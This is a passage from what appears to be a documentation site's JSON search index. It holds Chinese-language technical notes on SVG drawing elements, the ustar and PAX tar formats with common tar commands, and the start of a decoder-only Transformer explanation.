x=\"20\" y=\"120\" dominant-baseline=\"middle\"&gt;middle abc123&lt;/text&gt;\n&lt;line x1=\"20\" y1=\"120\" x2=\"160\" y2=\"120\" stroke=\"blue\" stroke-width=\"1\" /&gt;\n&lt;text x=\"20\" y=\"150\" dominant-baseline=\"central\"&gt;central abc123&lt;/text&gt;\n&lt;line x1=\"20\" y1=\"150\" x2=\"160\" y2=\"150\" stroke=\"blue\" stroke-width=\"1\" /&gt;\n&lt;text x=\"20\" y=\"180\" dominant-baseline=\"mathematical\"&gt;mathematical abc123&lt;/text&gt;\n&lt;line x1=\"20\" y1=\"180\" x2=\"160\" y2=\"180\" stroke=\"blue\" stroke-width=\"1\" /&gt;\n&lt;text x=\"20\" y=\"210\" dominant-baseline=\"hanging\"&gt;hanging abc123&lt;/text&gt;\n&lt;line x1=\"20\" y1=\"210\" x2=\"160\" y2=\"210\" stroke=\"blue\" stroke-width=\"1\" /&gt;\n&lt;text x=\"20\" y=\"240\" dominant-baseline=\"text-top\"&gt;text-top abc123&lt;/text&gt;\n&lt;line x1=\"20\" y1=\"240\" x2=\"160\" y2=\"240\" stroke=\"blue\" stroke-width=\"1\" /&gt;\n</code></pre> <p> text-bottom abc123 alphabetic abc123 ideographic abc123 middle abc123 central abc123 mathematical abc123 hanging abc123 text-top abc123 </p> <p>\u200b\u8fd9\u4e9b\u200b\u503c\u200b\u6765\u81ea\u200b\u4e8e\u200b\u5b57\u4f53\u200b\u7684\u200b baseline \u200b\u8bbe\u7f6e\u200b\uff0c\u200b\u89c1\u200b The 'bsln' table\u3002</p>"},{"location":"software/svg.html#ellipse","title":"ellipse","text":"<p>Ellipse\uff1a\u200b\u692d\u5706\u200b\u6216\u8005\u200b\u5706\u200b\uff0c\u200b\u4ee5\u200b (cx, cy) \u200b\u4e3a\u200b\u4e2d\u5fc3\u200b\uff0c(rx, ry) \u200b\u4e3a\u200b X \u200b\u548c\u200b Y \u200b\u65b9\u5411\u200b\u4e0a\u200b\u7684\u200b\u534a\u5f84\u200b\uff1a</p> <pre><code>&lt;line x1=\"0\" y1=\"0\" x2=\"100\" y2=\"0\" stroke=\"black\" /&gt;\n&lt;line x1=\"0\" y1=\"0\" x2=\"0\" y2=\"100\" stroke=\"black\" /&gt;\n&lt;ellipse cx=\"50\" cy=\"50\" rx=\"40\" ry=\"40\" fill=\"red\" /&gt;\n</code></pre> <p> </p> <p>\u200b\u4e5f\u200b\u53ef\u4ee5\u200b\u76f4\u63a5\u200b\u7528\u200b circle \u200b\u6765\u200b\u753b\u5706\u200b\uff0c\u200b\u6b64\u65f6\u200b\u53ea\u6709\u200b\u4e00\u4e2a\u200b\u534a\u5f84\u200b\uff1a</p> <pre><code>&lt;line x1=\"0\" y1=\"0\" x2=\"100\" y2=\"0\" stroke=\"black\" /&gt;\n&lt;line x1=\"0\" y1=\"0\" x2=\"0\" y2=\"100\" stroke=\"black\" /&gt;\n&lt;circle cx=\"50\" cy=\"50\" r=\"40\" fill=\"blue\" /&gt;\n</code></pre> <p> </p>"},{"location":"software/svg.html#path","title":"path","text":"<p>path \u200b\u5141\u8bb8\u200b\u7528\u200b\u6bd4\u8f83\u200b\u7075\u6d3b\u200b\u7684\u200b\u8bed\u6cd5\u200b\u6765\u200b\u7ed8\u5236\u200b\u4e00\u6bb5\u200b\u56fe\u5f62\u200b\uff0c\u200b\u8bed\u6cd5\u200b\u7c7b\u4f3c\u200b\u4e8e\u200b\uff1a\u200b\u79fb\u52a8\u200b\u5230\u200b\u54ea\u91cc\u200b\uff0c\u200b\u7ed8\u5236\u200b\u4e00\u4e2a\u200b\u5230\u200b\u54ea\u91cc\u200b\u7684\u200b\u76f4\u7ebf\u200b/\u200b\u66f2\u7ebf\u200b\u7b49\u7b49\u200b\uff1a</p> <pre><code>&lt;path d=\"M 0 0 L 100 0, 100 100, 0 100\" stroke=\"black\" fill=\"none\" /&gt;\n</code></pre> <p> </p> <ol> <li><code>M 0 0</code>\uff08Move To\uff09\uff0c\u200b\u79fb\u52a8\u200b\u5230\u200b (0, 0)</li> <li><code>L 100 0</code>\uff08Line To\uff09\uff0c\u200b\u4ece\u200b\u5f53\u524d\u200b\u4f4d\u7f6e\u200b\u753b\u200b\u4e00\u6761\u7ebf\u200b\u5230\u200b (100, 0)</li> </ol> <p>\u200b\u6b64\u5904\u200b\u7ed9\u200b <code>L</code> \u200b\u547d\u4ee4\u200b\u4f20\u8f93\u200b\u4e86\u200b\u591a\u4e2a\u200b\u53c2\u6570\u200b\uff1a(100, 0)\u3001(100 100)\u3001(0, 100)\uff0c\u200b\u76f8\u5f53\u4e8e\u200b\u5148\u200b\u5212\u7ebf\u200b\u5230\u200b (100, 0)\uff0c\u200b\u518d\u200b\u5212\u7ebf\u200b\u5230\u200b (100, 100)\uff0c\u200b\u6700\u540e\u200b\u753b\u5230\u200b (0, 100)\u3002\u200b\u56e0\u4e3a\u200b\u6ca1\u6709\u200b\u7ed8\u5236\u200b\u56de\u5230\u200b\u539f\u70b9\u200b\u7684\u200b\u7ebf\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6ca1\u6709\u200b\u753b\u6210\u200b\u4e00\u4e2a\u200b\u6b63\u65b9\u5f62\u200b\u3002</p> <p>\u200b\u5b8c\u6574\u200b\u7684\u200b\u547d\u4ee4\u200b\u5217\u8868\u200b\u89c1\u200b Path commands\uff0c\u200b\u5206\u4e3a\u200b\u4ee5\u4e0b\u200b\u51e0\u7c7b\u200b\uff1a</p> <ol> <li>MoveTo\uff08\u200b\u79fb\u52a8\u200b\uff09: M, m</li> <li>LineTo\uff08\u200b\u753b\u7ebf\u200b\uff09: L, l\uff08\u200b\u753b\u200b\u4efb\u610f\u200b\u65b9\u5411\u200b\u7684\u200b\u7ebf\u200b\uff09, H, h\uff08\u200b\u753b\u200b\u6a2a\u5411\u200b\u7ebf\u200b\uff09, V, v\uff08\u200b\u753b\u200b\u7eb5\u5411\u200b\u7ebf\u200b\uff09</li> <li>Cubic B\u00e9zier Curve\uff08\u200b\u4e09\u6b21\u200b\u8d1d\u585e\u5c14\u200b\u66f2\u7ebf\u200b\uff09: C, c, S, s</li> <li>Quadratic B\u00e9zier Curve\uff08\u200b\u4e8c\u6b21\u200b\u8d1d\u585e\u5c14\u200b\u66f2\u7ebf\u200b\uff09: Q, q, T, t</li> <li>Elliptical Arc Curve\uff08\u200b\u692d\u5706\u200b\u4e0a\u200b\u7684\u200b\u5f27\u7ebf\u200b\uff09: A, a</li> <li>ClosePath\uff08\u200b\u56de\u5230\u200b\u8d77\u59cb\u200b\u70b9\u200b\uff09: Z, z</li> </ol> <p>\u200b\u547d\u4ee4\u200b\u7684\u200b\u5927\u5199\u200b\u7248\u672c\u200b\u901a\u5e38\u200b\u8868\u793a\u200b\u53c2\u6570\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b\u7edd\u5bf9\u200b\u5750\u6807\u200b\uff1b\u200b\u5c0f\u5199\u200b\u7248\u672c\u200b\u901a\u5e38\u200b\u8868\u793a\u200b\u53c2\u6570\u200b\u91c7\u7528\u200b\u7684\u200b\u662f\u200b\u76f8\u5bf9\u200b\u5750\u6807\u200b\uff0c\u200b\u8981\u200b\u4ece\u200b\u6700\u540e\u200b\u4e00\u6b21\u200b\u7ed8\u5236\u200b\u7684\u200b\u5750\u6807\u200b\u52a0\u4e0a\u200b\u76f8\u5bf9\u200b\u5750\u6807\u200b\u8ba1\u7b97\u200b\u51fa\u65b0\u200b\u7684\u200b\u7edd\u5bf9\u200b\u5750\u6807\u200b\u3002</p>"},{"location":"software/svg.html#viewbox","title":"viewBox","text":"<p>viewBox \u200b\u8868\u793a\u200b\u8981\u200b\u663e\u793a\u200b\u5750\u6807\u8f74\u200b\u4e0a\u200b\u54ea\u4e2a\u200b\u8303\u56f4\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u56db\u4e2a\u200b\u6570\u5b57\u200b <code>min-x min-y width height</code>\uff1a</p> <pre><code>&lt;svg viewBox=\"0 0 100 100\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n    &lt;line x1=\"0\" y1=\"100\" x2=\"100\" y2=\"0\" stroke=\"black\" /&gt;\n    &lt;line x1=\"0\" y1=\"0\" x2=\"100\" y2=\"100\" stroke=\"blue\" /&gt;\n&lt;/svg&gt;\n</code></pre> <p> </p> <p>\u200b\u7f29\u5c0f\u200b viewBox \u200b\u4ee5\u540e\u200b\uff0c\u200b\u53ea\u80fd\u200b\u770b\u5230\u200b\u5de6\u4e0a\u89d2\u200b\u7684\u200b\u4e00\u6bb5\u200b\u84dd\u7ebf\u200b\uff1a</p> <pre><code>&lt;svg viewBox=\"0 0 50 50\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n    &lt;line x1=\"0\" y1=\"100\" x2=\"100\" y2=\"0\" stroke=\"black\" /&gt;\n    &lt;line x1=\"0\" y1=\"0\" x2=\"100\" y2=\"100\" stroke=\"blue\" /&gt;\n&lt;/svg&gt;\n</code></pre> <p> </p> <p>\u200b\u7f29\u5c0f\u200b viewBox \u200b\u7684\u200b\u540c\u65f6\u200b\uff0c\u200b\u5728\u200b\u9875\u9762\u200b\u4e2d\u200b\u5360\u7528\u200b\u7684\u200b\u7a7a\u95f4\u200b\u4e0d\u53d8\u200b\uff0c\u200b\u56e0\u6b64\u200b\u56fe\u50cf\u200b\u5185\u5bb9\u200b\u4f1a\u200b\u663e\u5f97\u200b\u66f4\u5927\u200b\uff1a</p> <pre><code>&lt;svg viewBox=\"40 40 20 20\" xmlns=\"http://www.w3.org/2000/svg\"&gt;\n    &lt;line x1=\"0\" y1=\"100\" x2=\"100\" y2=\"0\" stroke=\"black\" /&gt;\n    &lt;line x1=\"0\" y1=\"0\" x2=\"100\" y2=\"100\" stroke=\"blue\" /&gt;\n&lt;/svg&gt;\n</code></pre> <p> </p>"},{"location":"software/svg.html#animate","title":"animate","text":"<p>animate \u200b\u53ef\u4ee5\u200b\u52a8\u6001\u200b\u5730\u200b\u66f4\u65b0\u200b SVG \u200b\u7684\u200b\u5143\u7d20\u200b\u5c5e\u6027\u200b\uff0c\u200b\u4ece\u800c\u200b\u5b9e\u73b0\u200b\u52a8\u753b\u200b\u6548\u679c\u200b\u3002\u200b\u4f8b\u5982\u200b\uff0c\u200b\u52a8\u6001\u200b\u5730\u200b\u8bbe\u7f6e\u200b\u5706\u200b\u7684\u200b\u534a\u5f84\u200b\uff1a</p> <pre><code>&lt;circle cx=\"50\" cy=\"50\" fill=\"blue\"&gt;\n    &lt;animate\n        attributeName=\"r\"\n        values=\"0;40;0\"\n        dur=\"4s\"\n        repeatCount=\"indefinite\" /&gt;\n&lt;/circle&gt;\n&lt;circle cx=\"150\" cy=\"50\" fill=\"red\"&gt;\n    &lt;animate\n        attributeName=\"r\"\n        values=\"40;0\"\n        dur=\"2s\"\n        repeatCount=\"indefinite\" /&gt;\n&lt;/circle&gt;\n</code></pre> <p> </p> <p>\u200b\u4e0a\u9762\u200b\u7684\u200b\u4ee3\u7801\u200b\u8868\u793a\u200b\u5bf9\u200b <code>circle</code> \u200b\u7684\u200b\u534a\u5f84\u200b\u5c5e\u6027\u200b <code>r</code> \u200b\u8bbe\u7f6e\u200b\u52a8\u6001\u200b\u66f4\u65b0\u200b\uff0c\u200b\u89c4\u5219\u200b\u662f\u4ece\u200b 0 \u200b\u5230\u200b 40 \u200b\u518d\u200b\u53d8\u56de\u200b 0\u3002\u200b\u4e00\u6b21\u200b\u5faa\u73af\u200b\u82b1\u8d39\u200b 5s\uff0c\u200b\u65e0\u9650\u200b\u5faa\u73af\u200b\u3002</p> <p>\u200b\u5982\u679c\u200b\u8981\u200b\u8ba9\u200b\u5143\u7d20\u200b\u6309\u7167\u200b\u8def\u5f84\u200b\u79fb\u52a8\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u7528\u200b <code>animateMotion</code> \u200b\u6307\u5b9a\u200b\u79fb\u52a8\u200b\u7684\u200b\u8def\u5f84\u200b\uff1a</p> <pre><code>&lt;path d=\"M 10 10 L 90 10, 90 90, 10 90 z\" fill=\"none\" stroke=\"black\" /&gt;\n&lt;circle r=\"5\" fill=\"blue\"&gt;\n    &lt;animateMotion\n        path=\"M 10 10 L 90 10, 90 90, 10 90 z\"\n        dur=\"4s\"\n        repeatCount=\"indefinite\" /&gt;\n&lt;/circle&gt;\n</code></pre> <p> </p>"},{"location":"software/svg.html#_2","title":"\u53c2\u8003","text":"<ul> <li>https://www.w3.org/Graphics/SVG/IG/resources/svgprimer.html</li> <li>https://developer.mozilla.org/en-US/docs/Web/SVG</li> </ul>"},{"location":"software/tar.html","title":"tar \u200b\u6587\u4ef6\u683c\u5f0f","text":"<p>\u200b\u63a8\u8350\u200b\u9605\u8bfb\u200b\uff1atar.5\u3002</p>"},{"location":"software/tar.html#ustar","title":"ustar","text":"<p>tar \u200b\u7684\u200b\u6587\u4ef6\u683c\u5f0f\u200b\u6bd4\u8f83\u7b80\u5355\u200b\uff0c\u200b\u5c31\u662f\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b File Entry\uff0c\u200b\u6700\u540e\u200b\u662f\u200b\u4e24\u4e2a\u200b 512 \u200b\u5b57\u8282\u200b\u7684\u200b\u5168\u200b 0\uff0c\u200b\u8868\u793a\u200b\u7ed3\u675f\u200b\u3002\u200b\u6bcf\u4e2a\u200b File Entry \u200b\u7531\u200b\u5934\u90e8\u200b\u548c\u200b\u6570\u636e\u200b\u7ec4\u6210\u200b\uff0c\u200b\u5934\u90e8\u200b\u7684\u200b\u683c\u5f0f\u200b\u662f\u200b\uff1a</p> <pre><code>/* Source: https://www.gnu.org/software/tar/manual/html_node/Standard.html */\n/* tar Header Block, from POSIX 1003.1-1990.  */\n\n/* POSIX header.  */\n\nstruct posix_header\n{                              /* byte offset */\n  char name[100];               /*   0 */\n  char mode[8];                 /* 100 */\n  char uid[8];                  /* 108 */\n  char gid[8];                  /* 116 */\n  char size[12];                /* 124 */\n  char mtime[12];               /* 136 */\n  char chksum[8];               /* 148 */\n  char typeflag;                /* 156 */\n  char linkname[100];           /* 157 */\n  char magic[6];                /* 257 */\n  char version[2];              /* 263 */\n  char uname[32];               /* 265 */\n  char gname[32];               /* 297 */\n  char devmajor[8];             /* 329 */\n  char devminor[8];             /* 337 */\n  char prefix[155];             /* 345 */\n                                /* 500 */\n};\n</code></pre> <p>\u200b\u8fd9\u4e2a\u200b\u7248\u672c\u200b\u53eb\u505a\u200b ustar \u200b\u683c\u5f0f\u200b\uff08Unix Standard TAR\uff09\uff0c\u200b\u5728\u200b POSIX.1-1988 \u200b\u6807\u51c6\u200b\u4e2d\u200b\u5b9a\u4e49\u200b\u3002\u200b\u6240\u4ee5\u200b <code>magic</code> \u200b\u5b57\u6bb5\u200b\u7684\u200b\u5185\u5bb9\u200b\u5c31\u662f\u200b <code>ustar</code>\u3002</p> <p>\u200b\u53ef\u4ee5\u200b\u770b\u5230\u200b\uff0c\u200b\u5c31\u662f\u200b\u4e00\u7cfb\u5217\u200b\u7684\u200b char \u200b\u6570\u7ec4\u200b\uff0c\u200b\u91cc\u9762\u200b\u7684\u200b\u5f88\u591a\u200b\u6570\u5b57\u200b\u5b57\u200b\u6bb5\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>mode</code>\uff0c<code>uid</code> \u200b\u548c\u200b <code>gid</code> \u200b\u7b49\u200b\uff0c\u200b\u90fd\u200b\u662f\u200b\u7528\u200b ASCII \u200b\u7801\u5199\u200b\u7684\u200b\u3002\u200b\u7531\u4e8e\u200b\u5934\u90e8\u200b\u9700\u8981\u200b\u5bf9\u9f50\u200b\u5230\u200b 512 \u200b\u5b57\u8282\u200b\uff0c\u200b\u6240\u4ee5\u200b\u5b9e\u9645\u4e0a\u200b\u540e\u9762\u200b\u8fd8\u6709\u200b 12 \u200b\u5b57\u8282\u200b\u7684\u200b padding\u3002</p> <p>\u200b\u5934\u90e8\u200b\u7684\u200b 512 \u200b\u5b57\u8282\u200b\u7ed3\u675f\u200b\u540e\u200b\uff0c\u200b\u7d27\u63a5\u7740\u200b\u5c31\u662f\u200b\u6587\u4ef6\u200b\u7684\u200b\u5185\u5bb9\u200b\uff0c\u200b\u5185\u5bb9\u200b\u7684\u200b\u5927\u5c0f\u200b\u5728\u200b\u5934\u90e8\u200b\u7684\u200b <code>size</code> \u200b\u5b57\u200b\u6bb5\u200b\u5df2\u7ecf\u200b\u4fdd\u5b58\u200b\uff0c\u200b\u628a\u200b\u5b57\u7b26\u4e32\u200b\u5f53\u6210\u200b 8 \u200b\u8fdb\u5236\u200b\u6570\u200b\u8f6c\u6362\u200b\uff0c\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u5f97\u5230\u200b\u6587\u4ef6\u200b\u957f\u5ea6\u200b\u3002\u200b\u6587\u4ef6\u200b\u4e5f\u200b\u8981\u200b\u5bf9\u9f50\u200b\u5230\u200b 512 \u200b\u5b57\u8282\u200b\uff0c\u200b\u6240\u4ee5\u200b\u6587\u4ef6\u200b\u540e\u9762\u200b\u8fd8\u6709\u200b\u82e5\u5e72\u4e2a\u200b 0 \u200b\u4f5c\u4e3a\u200b padding\u3002</p> <p>\u200b\u603b\u7ed3\u200b\u4e00\u4e0b\u200b\uff0ctar \u200b\u6587\u4ef6\u200b\u7684\u200b\u683c\u5f0f\u200b\u5c31\u662f\u200b\uff1a<code>(\u200b\u5934\u90e8\u200b\uff0c\u200b\u6570\u636e\u200b)*\u200b\u7ed3\u5c3e\u200b</code>\u3002\u200b\u6bcf\u200b\u4e00\u4e2a\u200b\u90e8\u5206\u200b\u90fd\u200b\u5bf9\u9f50\u200b\u5230\u200b 512 \u200b\u5b57\u8282\u200b\u3002</p>"},{"location":"software/tar.html#pax","title":"pax","text":"<p>\u200b\u5982\u679c\u200b\u4ed4\u7ec6\u89c2\u5bdf\u200b\uff0c\u200b\u4f1a\u200b\u53d1\u73b0\u200b\u4e0a\u9762\u200b\u7684\u200b <code>posix_header</code> \u200b\u91cc\u9762\u200b\uff0c<code>name</code> \u200b\u5b57\u200b\u6bb5\u200b\u53ea\u6709\u200b 100 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c<code>prefix</code> \u200b\u5b57\u6bb5\u200b\u4e5f\u200b\u53ea\u6709\u200b 155 \u200b\u4e2a\u200b\u5b57\u8282\u200b\uff0c\u200b\u610f\u5473\u7740\u200b\u5982\u679c\u200b\u6587\u4ef6\u200b\u8def\u5f84\u200b\u7279\u522b\u200b\u957f\u200b\uff0c\u200b\u90a3\u200b\u5c31\u200b\u653e\u4e0d\u4e0b\u200b\uff0c\u200b\u53ea\u80fd\u200b\u622a\u65ad\u200b\u4e86\u200b\u3002\u200b\u4e3a\u4e86\u200b\u89e3\u51b3\u200b\u8fd9\u4e2a\u200b\u95ee\u9898\u200b\uff0cPOSIX.1-2001 \u200b\u6807\u51c6\u200b\u7ed9\u200b tar \u200b\u5f15\u5165\u200b\u4e86\u200b PAX \u200b\u6269\u5c55\u200b\u3002</p> <p>\u200b\u5177\u4f53\u6765\u8bf4\u200b\uff0cPAX \u200b\u6269\u5c55\u200b\u4ee5\u200b\u7279\u6b8a\u200b\u7684\u200b\u6587\u4ef6\u200b\u5f62\u5f0f\u200b\u5b58\u5728\u200b\u3002\u200b\u4f8b\u5982\u200b\u8981\u200b\u8bb0\u5f55\u200b\u4e00\u4e2a\u200b\u540d\u5b57\u200b\u5f88\u957f\u200b\u7684\u200b\u6587\u4ef6\u200b <code>'X'*101</code>\uff0c\u200b\u5b9e\u9645\u4e0a\u200b tar \u200b\u4e2d\u200b\u8bb0\u5f55\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u6587\u4ef6\u200b\uff1a</p> <ol> <li>PaxHeader\uff1a\u200b\u7279\u6b8a\u200b\u7684\u200b PAX \u200b\u6587\u4ef6\u200b\uff0c\u200b\u4e0d\u200b\u5bf9\u5e94\u200b\u5b9e\u9645\u200b\u7684\u200b\u6587\u4ef6\u200b</li> <li><code>'X'*100</code>\uff1a\u200b\u6587\u4ef6\u540d\u200b\u88ab\u200b\u622a\u65ad\u200b\uff0c\u200b\u5176\u4ed6\u200b\u4e0d\u53d8\u200b</li> </ol> <p>\u200b\u8fd9\u4e2a\u200b PaxHeader \u200b\u5728\u200b\u89e3\u538b\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u4e0d\u4f1a\u200b\u751f\u6210\u200b\u5b9e\u9645\u200b\u7684\u200b\u6587\u4ef6\u200b\u3002\u200b\u5b83\u200b\u7684\u200b\u5185\u5bb9\u200b\u662f\u200b\u4e00\u4e9b\u200b\u952e\u503c\u200b\u5bf9\u200b\uff0c\u200b\u4f8b\u5982\u200b\uff1a</p> <pre><code>123 path=XXXXXXXXXXXXXXXXX...\n</code></pre> <p>\u200b\u683c\u5f0f\u200b\u662f\u200b\uff1a<code>length key=value\\n</code>\uff0c\u200b\u7136\u540e\u200b\u53ef\u4ee5\u200b\u6709\u200b\u591a\u4e2a\u200b\u8fd9\u6837\u200b\u7684\u200b\u952e\u503c\u200b\u5bf9\u200b\u3002\u200b\u8fd9\u6837\u200b\u5c31\u200b\u53ef\u4ee5\u200b\u89e3\u51b3\u200b <code>posix_header</code> \u200b\u91cc\u200b\u540d\u5b57\u200b\u957f\u5ea6\u200b\u9650\u5236\u200b\u7684\u200b\u95ee\u9898\u200b\uff1a\u200b\u53ea\u8981\u200b\u5728\u200b PaxHeader \u200b\u6587\u4ef6\u200b\u91cc\u200b\uff0c\u200b\u4fdd\u5b58\u200b\u4e00\u4e2a\u200b key \u200b\u4e3a\u200b path\uff0cvalue \u200b\u4e3a\u200b\u5b9e\u9645\u200b\u540d\u5b57\u200b\u7684\u200b\u4fe1\u606f\u200b\u3002\u200b\u90a3\u4e48\u200b tar \u200b\u5728\u200b\u770b\u5230\u200b PaxHeader \u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u8bb0\u5f55\u4e0b\u6765\u200b\uff0c\u200b\u518d\u200b\u9047\u5230\u200b\u4e0b\u200b\u4e00\u4e2a\u200b\u6587\u4ef6\u200b\u7684\u200b\u65f6\u5019\u200b\uff0c\u200b\u5c31\u200b\u77e5\u9053\u200b\u8981\u200b\u7528\u200b PaxHeader \u200b\u4e2d\u200b\u7684\u200b path\uff0c\u200b\u800c\u200b\u4e0d\u662f\u200b\u4fdd\u5b58\u200b\u5728\u200b <code>posix_header</code> \u200b\u4e2d\u200b\u7684\u200b <code>name[100]</code>\u3002</p> <p>\u200b\u7c7b\u4f3c\u200b\u5730\u200b\uff0cPaxHeader \u200b\u8fd8\u200b\u53ef\u4ee5\u200b\u5b58\u200b\u5f88\u591a\u200b\u5176\u4ed6\u200b <code>posix_header</code> \u200b\u4e2d\u200b\u6ca1\u6709\u200b\u7684\u200b\u4fe1\u606f\u200b\uff0c\u200b\u4f8b\u5982\u200b <code>atime</code>\u3001<code>ctime</code> \u200b\u548c\u200b <code>uid</code> \u200b\u7b49\u7b49\u200b\u3002\u200b\u5b8c\u6574\u200b\u5217\u8868\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b Extended header keywords\u3002</p> <p>\u200b\u5b8c\u6574\u200b\u7684\u200b pax \u200b\u6269\u5c55\u200b\u6587\u6863\u200b\uff0c\u200b\u53ef\u4ee5\u200b\u53c2\u8003\u200b pax interchange format\u3002</p>"},{"location":"software/tar.html#_1","title":"\u5e38\u7528\u547d\u4ee4","text":"<p>\u200b\u538b\u7f29\u200b\uff1a<code>tar cvzf archive.tar.gz &lt;sources&gt;</code></p> <p>\u200b\u89e3\u538b\u200b\uff1a<code>tar xvf archive.tar.gz</code></p> <p>\u200b\u5217\u51fa\u200b\u538b\u7f29\u5305\u200b\u5185\u5bb9\u200b\uff1a<code>tar tvf archive.tar.gz</code></p>"},{"location":"software/tar.html#tar_1","title":"\u5176\u4ed6\u200b tar \u200b\u683c\u5f0f","text":"<p>\u200b\u9664\u4e86\u200b\u4e0a\u9762\u200b\u7684\u200b ustar \u200b\u548c\u200b pax \u200b\u683c\u5f0f\u200b\uff0c\u200b\u8fd8\u6709\u200b\u66f4\u200b\u65e9\u671f\u200b\u7684\u200b v7 tar \u200b\u683c\u5f0f\u200b\uff0c\u200b\u53d6\u540d\u200b v7 \u200b\u662f\u56e0\u4e3a\u200b\u6700\u65e9\u200b\u51fa\u73b0\u200b\u5728\u200b 1979 \u200b\u5e74\u200b Version 7 Unix \u200b\u4e2d\u200b\u3002</p> <p>\u200b\u6b64\u5916\u200b\uff0cGNU tar \u200b\u4e5f\u200b\u66fe\u7ecf\u200b\u81ea\u5b9a\u4e49\u200b\u4e86\u200b tar \u200b\u683c\u5f0f\u200b\uff0cmagic \u200b\u4ece\u200b\u4e0a\u9762\u200b\u7684\u200b <code>ustar</code> \u200b\u53d8\u6210\u200b\u4e86\u200b <code>ustar</code>\uff08\u200b\u6ce8\u610f\u200b\u591a\u200b\u4e86\u200b\u4e24\u4e2a\u200b\u7a7a\u683c\u200b\uff09\uff1a</p> <pre><code>/* Source: https://www.gnu.org/software/tar/manual/html_node/Standard.html */\n/* The old GNU format header conflicts with POSIX format in such a way that\n   POSIX archives may fool old GNU tar's, and POSIX tar's might well be\n   fooled by old GNU tar archives.  An old GNU format header uses the space\n   used by the prefix field in a POSIX header, and cumulates information\n   normally found in a GNU extra header.  With an old GNU tar header, we\n   never see any POSIX header nor GNU extra header.  Supplementary sparse\n   headers are allowed, however.  */\n\nstruct oldgnu_header\n{                              /* byte offset */\n  char unused_pad1[345];        /*   0 */\n  char atime[12];               /* 345 Incr. archive: atime of the file */\n  char ctime[12];               /* 357 Incr. archive: ctime of the file */\n  char offset[12];              /* 369 Multivolume archive: the offset of\n                                   the start of this volume */\n  char longnames[4];            /* 381 Not used */\n  char unused_pad2;             /* 385 */\n  struct sparse sp[SPARSES_IN_OLDGNU_HEADER];\n                                /* 386 */\n  char isextended;              /* 482 Sparse file: Extension sparse header\n                                   follows */\n  char realsize[12];            /* 483 Sparse file: Real size*/\n                                /* 495 */\n};\n\n/* OLDGNU_MAGIC uses both magic and version fields, which are contiguous.\n   Found in an archive, it indicates an old GNU header format, which will be\n   hopefully become obsolescent.  With OLDGNU_MAGIC, uname and gname are\n   valid, though the header is not truly POSIX conforming.  */\n#define OLDGNU_MAGIC \"ustar  \"  /* 7 chars and a null */\n</code></pre> <p>\u200b\u4ee5\u53ca\u200b schily tar\uff0c\u200b\u7b80\u79f0\u200b star\u3002\u200b\u867d\u7136\u200b\u5386\u53f2\u200b\u4e0a\u200b\u51fa\u73b0\u200b\u4e86\u200b\u4e0d\u200b\u517c\u5bb9\u200b\u7684\u200b tar \u200b\u683c\u5f0f\u200b\uff0c\u200b\u76ee\u524d\u200b\u57fa\u672c\u200b\u7edf\u4e00\u200b\u5230\u200b\u4e86\u200b pax \u200b\u683c\u5f0f\u200b\u4e0a\u200b\u3002</p>"},{"location":"software/transformer.html","title":"Transformer","text":"<p>\u200b\u4e0b\u9762\u200b\u53ea\u200b\u8003\u8651\u200b Decoder-only \u200b\u7684\u200b Transformer\u3002</p>"},{"location":"software/transformer.html#_1","title":"\u8ba1\u7b97\u200b\u8fc7\u7a0b","text":"<p>\u200b\u8f93\u5165\u200b \\(n\\) \u200b\u4e2a\u200b Token\uff0c\u200b\u901a\u8fc7\u200b Text \u200b\u548c\u200b Position Embedding \u200b\u540e\u200b\uff0c\u200b\u5f97\u5230\u200b\u4e00\u4e2a\u200b\u5c3a\u5bf8\u200b\u4e3a\u200b \\((n, d_{model})\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff0c\u200b\u5176\u4e2d\u200b \\(d_{model}\\) \u200b\u4e3a\u200b Embedding \u200b\u5411\u91cf\u200b\u7684\u200b\u957f\u5ea6\u200b\u3002</p> <p>\u200b\u63a5\u7740\u200b\uff0c\u200b\u7ecf\u8fc7\u200b \\(n_{layer}\\) \u200b\u4e2a\u5c42\u200b\uff0c\u200b\u6bcf\u5c42\u200b\u4e2d\u8981\u200b\u8fdb\u884c\u200b\u5982\u4e0b\u200b\u7684\u200b\u8ba1\u7b97\u200b\uff1a</p> <ol> <li>\u200b\u4ece\u200b\u4e0a\u200b\u4e00\u5c42\u200b\u7684\u200b\u8f93\u51fa\u200b \\((n, d_{model})\\)\uff0c\u200b\u6bcf\u4e2a\u200b head \u200b\u4e0a\u4e58\u200b\u4ee5\u200b\u4e09\u4e2a\u200b \\((d_{model}, d_{head})\\) \u200b\u7684\u200b\u77e9\u9635\u200b\uff0c\u200b\u5f97\u5230\u200b Q\uff0cK \u200b\u548c\u200b V\uff0c\u200b\u5c3a\u5bf8\u200b\u4e3a\u200b \\((n, d_{head})\\)</li> <li>\u200b\u6309\u7167\u200b attention \u200b\u6fc0\u6d3b\u200b\u516c\u5f0f\u200b\uff0c\u200b\u5f97\u5230\u200b Z\uff0c\u200b\u5c3a\u5bf8\u200b\u4e3a\u200b \\((n, d_{head})\\)</li> <li>\u200b\u628a\u200b\u6240\u6709\u200b head \u200b\u7684\u200b Z \u200b\u77e9\u9635\u200b\u62fc\u200b\u8d77\u6765\u200b\uff0c\u200b\u4fdd\u8bc1\u200b \\(d_{model} = n_{head} * d_{head}\\)\uff0c\u200b\u90a3\u4e48\u200b\u6240\u6709\u200b\u7684\u200b Z \u200b\u62fc\u200b\u8d77\u6765\u200b\u4ee5\u540e\u200b\u5f97\u5230\u200b\u7684\u200b\u77e9\u9635\u200b\u7684\u200b\u5c3a\u5bf8\u200b\u4e3a\u200b \\((n, d_{model})\\)</li> <li>\u200b\u4e58\u4ee5\u200b\u4e00\u4e2a\u200b\u5c3a\u5bf8\u200b\u4e3a\u200b \\((d_{model}, d_{model})\\) \u200b\u7684\u200b 